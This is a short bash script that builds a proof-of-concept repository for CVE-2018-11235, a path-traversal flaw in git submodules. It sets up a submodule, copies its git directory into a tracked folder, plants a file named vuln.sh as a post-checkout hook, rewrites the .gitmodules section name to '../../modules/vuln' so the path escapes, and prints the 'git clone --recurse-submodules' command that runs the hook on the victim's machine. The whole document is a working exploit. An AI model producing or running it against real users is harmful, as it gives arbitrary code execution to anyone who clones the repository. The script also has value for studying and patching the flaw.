#!/bin/bash

set -e

repo_sub="repo_sub"
git init "$repo_sub"
cd "$repo_sub"
touch chybeta
git add chybeta
git commit -m "test"
cd ..

repo_par="$PWD/repo_par"
git init "$repo_par"
cd "$repo_par"

repo_submodule='./../repo_sub'
git submodule add "$repo_submodule" vuln

mkdir modules
cp -r .git/modules/vuln modules
cp ../vuln.sh modules/vuln/hooks/post-checkout
git add modules

git config -f .gitmodules --rename-section submodule.vuln submodule.../../modules/vuln

git submodule add "$repo_submodule"

git commit -m "CVE-2018-11235"

echo "git clone --recurse-submodules \"$repo_par\" dest_dir"